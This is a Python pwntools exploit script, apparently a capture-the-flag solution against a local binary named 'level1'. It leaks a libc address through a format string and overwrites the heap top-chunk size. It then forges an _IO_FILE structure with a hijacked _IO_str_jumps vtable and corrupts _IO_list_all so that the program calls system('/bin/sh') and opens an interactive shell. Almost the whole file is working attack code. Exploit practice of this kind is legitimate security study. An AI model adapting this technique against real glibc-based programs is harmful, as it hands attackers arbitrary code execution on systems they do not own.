'''https://xz.aliyun.com/t/2411
https://www.anquanke.com/post/id/168802
https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0
'''
from pwn import *
from FILE import *
context.log_level='debug'

def create(size,data):
    p.recvuntil('3:exit\n')
    p.sendline('1')
    p.recvuntil('size: ')
    p.sendline(str(size))
    p.recvuntil('string: ')
    p.sendline(data)

def show():
    p.recvuntil('3:exit\n')
    p.sendline('2')
    p.recvuntil('result: ')
    return p.recvuntil('\n')

def z(a=''):
	gdb.attach(p,a)
	if a == '':
		raw_input()


libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./level1')#,env={"LD_PRELOAD":"./libc-2.24.so"})


pay = 'b'*16 + p64(0) + p64(0xfe1)
#z()
create(16,pay)
pay = '%13$p'
create(0xfff,pay)

data = show()
start_main = int(data, 16)
libc_base = start_main - (libc.symbols['__libc_start_main'] + 240)
print 'libc_base= ' + hex(libc_base)


def possible_IO_str_jumps_offset():
  IO_file_jumps_offset = libc.sym['_IO_file_jumps']
  IO_str_underflow_offset = libc.sym['_IO_str_underflow']
  for ref_offset in libc.search(p64(IO_str_underflow_offset)):
      possible_IO_str_jumps_offset = ref_offset - 0x20
      if possible_IO_str_jumps_offset > IO_file_jumps_offset:
          success('possible_IO_str_jumps_offset:'+hex(possible_IO_str_jumps_offset))
          return possible_IO_str_jumps_offset

_IO_list_all = libc_base + libc.symbols['_IO_list_all']
success('_IO_list_all:'+hex(_IO_list_all))
#_IO_str_jumps = libc_base + libc.symbols['_IO_str_jumps']
_IO_str_jumps = libc_base + possible_IO_str_jumps_offset()
#_IO_str_jumps = libc_base + libc.symbols['_IO_file_jumps'] + 0xc0 #if NO _IO_str_jumps export, _IO_str_jumps - _IO_file_jumps = 0xc0
success('_IO_str_jumps:'+hex(_IO_str_jumps))
system = libc_base +libc.symbols['system']
binsh = libc_base + libc.search('/bin/sh\x00').next()

success('system:'+hex(system))
success('binsh:'+hex(binsh))

pay = 'A'*0x200 #could be 0x10 at least
#from FILE import *
context.arch = 'amd64'
fake_file = IO_FILE_plus_struct()
fake_file._flags = 0
fake_file._IO_read_ptr = 0x61
fake_file._IO_read_base =_IO_list_all-0x10
fake_file._IO_buf_base = binsh
fake_file._mode = 0
fake_file._IO_write_base = 0
fake_file._IO_write_ptr = 1
fake_file.vtable = _IO_str_jumps-8
pay+=str(fake_file).ljust(0xe8,'\x00')+p64(system)
create(0x200,pay)

# triger OVERFLOW
p.sendline('1')
p.sendline('0x60')

p.interactive()
